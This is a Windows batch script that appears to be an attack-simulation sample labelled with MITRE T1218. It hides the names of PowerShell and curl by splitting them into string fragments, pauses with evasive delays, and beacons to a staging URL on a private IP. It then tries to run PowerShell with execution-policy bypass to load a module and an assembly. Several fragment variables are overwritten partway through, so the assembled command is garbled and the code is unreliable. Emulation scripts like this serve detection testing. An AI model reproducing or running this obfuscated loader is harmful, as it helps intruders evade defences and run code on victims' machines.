@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals - NEVER obfuscated)
SET txisnba=%APPDATA%\7703\3a364733
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7703-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=onenote.txt
SET dvhhyc=7703
SET cklmfrn=1

REM Obfuscated LOLBIN references
SET aqwert=pow
SET bqwert=ers
SET cqwert=hel
SET dqwert=l.e
SET eqwert=xe
SET psvbn=cur
SET pscder=l.e
SET pstyer=xe
SET wewxc=-e
SET weiop=p b
SET werfgh=ypas
SET wevbnm=s
SET wedfgh=c "s
SET wezxcv=et-l
SET weasdf=ocat
SET weqazs=ion -
SET wewsxp=path
SET weedcv=c:\
SET werfvb=wind
SET wetgbn=ows\
SET weyhnm=diag
SET weujnm=nost
SET weiknm=ics\
SET weolkm=syst
SET wepkmn=em\n
SET welkjh=etwo
SET wehgfdr=rkin
SET wertyh=g; i
SET wertyu=mpor
SET werthg=t-mo
SET werfgv=dul
SET werfgh=e .\
SET werfvb=Util
SET wersxc=ityF
SET werdfv=unct
SET werdfg=ions
SET werfgh=.ps1
SET wersdf=; Re
SET werdsf=gSna
SET werfds=pin
SET wefghj= %tx
SET wehjkl=isnb
SET wertyu=a%\
SET weiopa=%xza
SET weasdf=npex
SET werfgh=;[Pr
SET wefghj=ogra
SET werfgh=m.Cl
SET werfvb=ass]
SET werfgh=::Da
SET werfvb=le()
SET weiopq="

REM Build command components using nested indirection
SET cmdbase=!aqwert!!bqwert!!cqwert!!dqwert!!eqwert!
SET runner1=!psvbn!!pscder!!pstyer!
SET argbase=!wewxc!!weiop!!werfgh!!wevbnm!
SET scriptpart1=!wedfgh!!wezxcv!!weasdf!!weqazs!!wewsxp!
SET scriptpart2=!weedcv!!werfvb!!wetgbn!!weyhnm!!weujnm!!weiknm!!weolkm!!wepkmn!!
SET scriptpart3=!welkjh!!wehgfdr!!wertyh!!wertyu!!werthg!!werfgv!!werfgh!!werfvb!
SET scriptpart4=!wersxc!!werdfv!!werdfg!!werfgh!!wersdf!!werdsf!!werfds!!wefghj!
SET scriptpart5=!wehjkl!!wertyu!!weiopa!!weasdf!!werfgh!!wefghj!!werfgh!!werfvb!
SET scriptpart6=!werfgh!!werfvb!!weiopq!

REM Create full command string with PHR_ variables
CALL SET scriptfull=%%scriptpart1%%%%scriptpart2%%%%scriptpart3%%%%scriptpart4%%%%scriptpart5%%%%scriptpart6%%

REM Delays - initial long delay
if "!cklmfrn!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_START=initial_60s>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul)
ping -n 61 127.0.0.1 >nul
if "!cklmfrn!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_RESULT=success>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul)

REM TTP: T1218 - Signed Binary Proxy Execution (Heartbeat check)
if "!cklmfrn!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: HEARTBEAT_START=!keghkgto!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul)
CALL SET runnerfull=%%runner1%%
!runnerfull! -k -s -o nul "!keghkgto!"
SET hbresult=!ERRORLEVEL!
if "!cklmfrn!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: HEARTBEAT_RESULT=errorlevel=!hbresult!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul)

REM Log TTP execution
SET hbres=0
SET hberr=
if "!hbresult!" NEQ "0" (SET hbres=1 & SET hberr=connection_failed)
echo [!DATE:~-4,4!-!DATE:~-7,2!-!DATE:~-10,2! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Binary_Proxy_Execution=!hbres!:!hberr!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul

REM Delay between operations
if "!cklmfrn!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_START=random_10-30s>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul)
SET /A delvar=!RANDOM! %% 20 + 10
timeout /t !delvar! /nobreak >nul
if "!cklmfrn!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_RESULT=!delvar!s>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul)

REM TTP: T1218 - Execute DLL via PowerShell
if "!cklmfrn!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: PROCESS_START=powershell_dll_exec>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul)
CALL SET fullcmd=%%cmdbase%% !argbase! !scriptfull!
!fullcmd!
SET execresult=!ERRORLEVEL!
if "!cklmfrn!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: PROCESS_RESULT=errorlevel=!execresult!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul)

REM Log TTP execution
SET execres=1
SET execerr=
if "!execresult!" NEQ "0" (SET execres=0 & SET execerr=assembly_load_failed)
echo [!DATE:~-4,4!-!DATE:~-7,2!-!DATE:~-10,2! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Binary_Proxy_Execution=!execres!:!execerr!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul

REM Final delay before exit
if "!cklmfrn!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_START=final_15s>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul)
CHOICE /C Y /N /D Y /T 15 >nul
if "!cklmfrn!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: SCRIPT_END=exit_code=!execresult!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul)

ENDLOCAL
exit /b !execresult!